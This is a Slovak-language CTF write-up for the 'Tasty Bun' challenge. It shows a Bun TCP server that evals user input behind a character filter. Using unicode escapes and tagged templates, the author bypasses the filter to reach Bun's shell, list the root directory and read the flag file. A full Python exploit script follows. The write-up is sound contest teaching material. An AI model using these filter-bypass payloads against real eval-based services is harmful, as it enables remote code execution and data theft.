# Zadanie

EN: The Tasty Bun bakery asked us for a pentest. Can you find a vulnerability in their baking software?

SK: Pek치re켿 The Tasty Bun n치s po쬴adala o penetra캜n칳 test. Dok치쬰코 n치js콘 zranite쬹os콘 v ich softv칠ri na pe캜enie?

`exp.cybergame.sk:7012`

**S칰bory:**

- tastybun_handout.zip

## Rie코enie

```dockerfile
FROM oven/bun:1.2.8
WORKDIR /app
COPY flag.txt /flag.txt
RUN mv /flag.txt /flag$(shuf -i 1-1000000 -n 1).txt
COPY tastybun.js .
RUN chmod +x tastybun.js
CMD ["./tastybun.js"]
```

Dockerfile hovor칤 o tom, 쬰 vlajka je ulo쬰n치 v kore켿ovom adres치ri s n치hodn칳mi 캜islami.

```javascript
#!/usr/bin/env bun

const net = require("net");

const bake = async (ingredients) => {
  return await eval(ingredients);
};

const hasValidIngredients = (recipe) => {
  const FORBIDDEN_INGREDIENTS = /[()\/\[\];"'_!]/;
  if (FORBIDDEN_INGREDIENTS.test(recipe)) {
    console.error("游볬 These ingredients will spoil our bun!");
    return false;
  }
  const flavors = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
  const tasteProfile = [];
  for (let i = 0; i < recipe.length; i++) {
    const ingredient = recipe[i];
    if (flavors.includes(ingredient) && !tasteProfile.includes(ingredient)) {
      tasteProfile.push(ingredient);
    }
  }
  if (tasteProfile.length > 2) {
    console.error(
      "游 Too many flavors will ruin the bun! Found " + tasteProfile.length
    );
    return false;
  }
  return true;
};

const bakery = net.createServer((customer) => {
  console.log("游볧 A hungry customer has arrived at the bakery!");
  customer.write("tasty-bun> ");

  customer.on("data", async (order) => {
    try {
      const recipe = order.toString().trim();

      if (recipe === "exit") {
        customer.write("游봂 Thank you for visiting our bakery! Goodbye!\n");
        customer.end();
        return;
      }

      if (!hasValidIngredients(recipe)) {
        customer.write("游꼴 Sorry, we can't bake with these ingredients!\n");
        customer.write("tasty-bun> ");
        return;
      }

      const bakedBun = await bake(recipe);
      customer.write(bakedBun + "\n");
    } catch (e) {
      console.error("Error during baking:", e);
      customer.write("游 Oops! The bun fell flat: " + e.toString() + "\n");
    }

    customer.write("tasty-bun> ");
  });

  customer.on("error", (err) => {
    console.error("Socket error:", err);
    customer.write("游봂 A socket error occurred, but we're still open!\n");
    customer.write("tasty-bun> ");
  });

  customer.on("end", () => {
    console.log("游볻 A customer has left our bakery");
  });
});

process.on("unhandledRejection", (reason, promise) => {
  console.error("Unhandled Rejection at:", promise, "reason:", reason);
});

process.on("uncaughtException", (err) => {
  console.error("Unhandled exception caught:", err);
});

const displayBakeryBanner = () => {
  console.log(`
  游륋린넗린뒳린游꼴游볻 "The Tasty Bun" Bakery 游볻游꼴游봂游볬游볧游
  Welcome to our special bun shop!
  We are very particular about our ingredients...
  `);
};

displayBakeryBanner();
bakery.listen(2337, () => {
  console.log("游 Bakery now open on port 2337! Come get your tasty buns!");
});
```

Zo zdroj치ku vid칤me ur캜it칠 obmedzenia znakov, ktor칠 nesmieme pou쬴콘, z toho 캜o m칪쬰me n치m ost치va napr칤klad 

```
{ } ` $
```

A pr치ve tieto n치m hovoria o mo쬹osti pou쬴tia tzv. 'tag templates'. 

Okrem toho v코ak m치me obmedzenie, 쬰 cel칳 jeden payload nesmie obsahova콘 viac ako dve unik치tne p칤smen치, navy코e case sensitive, tak쬰 aj aA sa ber칰 ako dve r칪zne p칤smen치..

Z dockerfile je zrejm칠, 쬰 ide o bun, tak쬰 vieme prist칰pi콘 k shellu pomocou Bun objektu a dol치ru.. 

```
tasty-bun> Bun
游꼴 Sorry, we can't bake with these ingredients!
```

Ale obmedzenie na dve p칤smenk치... ako sa spr치vaj칰 unicode n치hrady?

```
tasty-bun> \u0042\u0075\u006e
[object Bun]
```

To by 코lo... 캜o shell?

```
tasty-bun> \u0042\u0075\u006e.$
[object Function]
```

OK... Sk칰sim nie캜o zavola콘

```
tasty-bun> \u0042\u0075\u006e.$
[object Function]
tasty-bun> \u0042\u0075\u006e.$()
游꼴 Sorry, we can't bake with these ingredients!
tasty-bun> \u0042\u0075\u006e.$''
游꼴 Sorry, we can't bake with these ingredients!
tasty-bun> \u0042\u0075\u006e.$``
[object Object]
```

Vracia objekt, to nie je zl칠.. ale ako posklada콘 pr칤kaz s pou쬴t칤m dvoch p칤smeniek. Viem priradi콘 a concatenate???

```
tasty-bun> a=1
1
tasty-bun> a
1
tasty-bun> $1=ba
游 Oops! The bun fell flat: ReferenceError: ba is not defined
tasty-bun> $1=`ba`
ba
tasty-bun> $1+=`\u005f`
ba_
tasty-bun> $1
ba_
```

Vyzer치, 쬰 치no. A dokonca aj `$1` akceptuje ako premenn칰, 캜o je super, lebo u코etr칤m p칤smenko.

sk칰sim vykona콘 `cat /flag*`

```
tasty-bun> $1=`ca`
ca
tasty-bun> $1+=`t /`
游꼴 Sorry, we can't bake with these ingredients! -aha, zak치zan칠 /
tasty-bun> $1+=`t \u002f`
游꼴 Sorry, we can't bake with these ingredients! - t,u,f - 3 p칤smen치
tasty-bun> $1+=`t `
cat
tasty-bun> $1+=`\u002f`
cat /
tasty-bun> $1+=`fl`
cat /fl
tasty-bun> $1+=`ag`
cat /flag
tasty-bun> $1+=`*`
cat /flag*
tasty-bun> $666 = \u0042\u0075\u006e.$ - prirad칤m si funkciu shell pod $666
[object Function]
tasty-bun> $666`${$1}`
游 Oops! The bun fell flat: ShellError: Failed with exit code 1
```

Ach... Nie캜o sa pokazilo.. Mo쬹o Bun shell nespracoval cat /flag* ako cat + argument, ale cel칠 ako jeden pr칤kaz

```
Error during baking:  7 |   class ShellError extends Error {
 8 |     #output = @undefined;
 9 |     info;
10 |     exitCode;
11 |     stdout;
12 |     constructor() {
                    ^
ShellError: Failed with exit code 1
 exitCode: 1,
   stdout: Buffer(0) [],
   stderr: Buffer(35) [ 98, 117, 110, 58, 32, 99, 111, 109, 109, 97, 110, 100, 32, 110, 111, 116, 32, 102, 111, 117, 110, 100, 58, 32, 99, 97, 116, 32, 47, 102, 108, 97, 103, 42, 10 ],

      at new ShellError (12:16)
      at new ShellPromise (77:16)
      at BunShell (193:35)
      at eval (file:///app/tastybun.js:1:3)
      at <anonymous> (/app/tastybun.js:6:16)
      at bake (/app/tastybun.js:5:21)
      at <anonymous> (/app/tastybun.js:52:30)
      at <anonymous> (/app/tastybun.js:36:30)
      at emit (node:events:89:22)
```

Mal som lok치lny docker, a hl치si v stderr 

```
bun: command not found: cat /flag*
```

Sk칰sim to rozdeli콘 na dva stringy oddelen칠 medzeou, s칤ce to bude zrejm칠 to ist칠, ale u ma neprekvap칤 niekedy ni캜..

```
tasty-bun> $666=\u0042\u0075\u006e.$
[object Function]
tasty-bun> $1=`ca`
ca
tasty-bun> $1+=`t`
cat
tasty-bun> $2=`\u002f`
/
tasty-bun> $2+=`fl`
/fl
tasty-bun> $2+=`ag*`
/flag*
tasty-bun> $666`${$1} ${$1}`
游 Oops! The bun fell flat: ShellError: Failed with exit code 1
```

```
stderr: Buffer(41) [ 47, 98, 105, 110, 47, 99, 97, 116, 58, 32, 99, 97, 116, 58, 32, 78, 111, 32, 115, 117, 99, 104, 32, 102, 105, 108, 101, 32, 111, 114, 32, 100, 105, 114, 101, 99, 116, 111, 114, 121, 10 ]

/bin/cat: cat: No such file or directory
```

A neprekvapilo. To je zmena, cat u pozn치, ale nevie pre캜칤ta콘 vlajku... 쬰by Bun shell neakceptoval n치hradn칠 znaky?

Sk칰sim `ls /` ako `ls` a `/`

```
tasty-bun> $1=`ls`
ls
tasty-bun> $2=`\u002f`
/
tasty-bun> $666`${$1} ${$2}`
[object Object]
```

Vr치tilo objekt... Chcel som ale print, tak budem potrebovat zavolat text(), ale bez z치tvoriek. Malo by to fungova콘 aj s backtickom..

```
tasty-bun> $666`${$1} ${$2}`.text``
游꼴 Sorry, we can't bake with these ingredients!
```

Ach jo.. mus칤m nahradi콘 unicode verziou

```
tasty-bun> $666`${$1} ${$2}`.\u0074\u0065\u0078\u0074``
etc
boot
bin
opt
mnt
var
lib64
lib
home
sys
srv
run
sbin
media
proc
tmp
root
dev
usr
app
flag494711.txt
```

Viem n치zov vlajky, sk칰sim zavola콘 `cat flag494711`

```
tasty-bun> $1=`ca`
ca
tasty-bun> $1+=`t`
cat

tasty-bun> $2=`\u002f`
/
tasty-bun> $2+=`fl`
/fl
tasty-bun> $2+=`ag`
/flag
tasty-bun> $2+=`494711.txt`
/flag494711.txt

tasty-bun> $666`${$1} ${$2}`.\u0074\u0065\u0078\u0074``
SK-CERT{fake_flag_for_testing}
```

Lok치lne funguje... teraz na ostro

```
nc exp.cybergame.sk 7012
tasty-bun> $666=\u0042\u0075\u006e.$
[object Function]
tasty-bun> $1=`ls`
ls
tasty-bun> $2=`\u002f`
/
tasty-bun> $666`${$1} ${$2}`.\u0074\u0065\u0078\u0074``
lib
etc
usr
lib64
root
run
home
bin
sbin
srv
proc
tmp
boot
var
dev
opt
mnt
media
sys
app
flag123615.txt

tasty-bun> $1=`ca`
ca
tasty-bun> $1+=`t`
cat
tasty-bun> $2=`\u002f`
/
tasty-bun> $2+=`fl`
/fl
tasty-bun> $2+=`ag`
/flag
tasty-bun> $2+=`123615.txt`
/flag123615.txt
tasty-bun> $666`${$1} ${$2}`.\u0074\u0065\u0078\u0074``
SK-CERT{\u0074\u0068\u0069\u0073\u0020\u0069\u0073\u0020\u0066\u0075\u006E}
```



AllInOne skript

```python
import socket
import re

HOST = 'exp.cybergame.sk'
PORT = 7012

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))

    def recv_until(prompt=b'tasty-bun> '):
        data = b''
        while prompt not in data:
            data += s.recv(1024)
        return data

    def send(cmd):
        s.sendall(cmd.encode() + b'\n')
        return recv_until()

    recv_until()

    # Execute directory listing
    send("$666=\\u0042\\u0075\\u006e.$")
    send("$1=`ls`")
    send("$2=`\\u002f`")

    response = send("$666`${$1} ${$2}`.\\u0074\\u0065\\u0078\\u0074``").decode()

    # Find the flag file dynamically
    match = re.search(r'(flag\d+\.txt)', response)
    if not match:
        print("Flag file not found.")
        exit()

    flag_file = '/' + match.group(1)
    print(f"Flag file found: {flag_file}")

    # Prepare 'cat'
    send("$1=`ca`")
    send("$1+=`t`")

    # Prepare flag file path using unicode chars one-by-one
    send(f"$2=`\\u{ord(flag_file[0]):04x}`")
    for char in flag_file[1:]:
        unicode_char = f"\\u{ord(char):04x}"
        send(f"$2+=`{unicode_char}`")

    # Execute 'cat <flag>'
    response = send("$666`${$1} ${$2}`.\\u0074\\u0065\\u0078\\u0074``").decode()

    # Extract and print the flag
    flag_match = re.search(r'(SK-CERT\{.*?\})', response)
    if flag_match:
        print(f"FLAG: {flag_match.group(1)}")
    else:
        print("Flag not found in response.")
```



Vlajku m치me, ale vyzer치 to na easter egg tro코ku, 캜o je vn칰tri vlajky?

```
tasty-bun> `\u0074\u0068\u0069\u0073\u0020\u0069\u0073\u0020\u0066\u0075\u006E`
this is fun
```

Autori maj칰 zmysel pre humor!

## Vlajka

```
SK-CERT{\u0074\u0068\u0069\u0073\u0020\u0069\u0073\u0020\u0066\u0075\u006E}
```
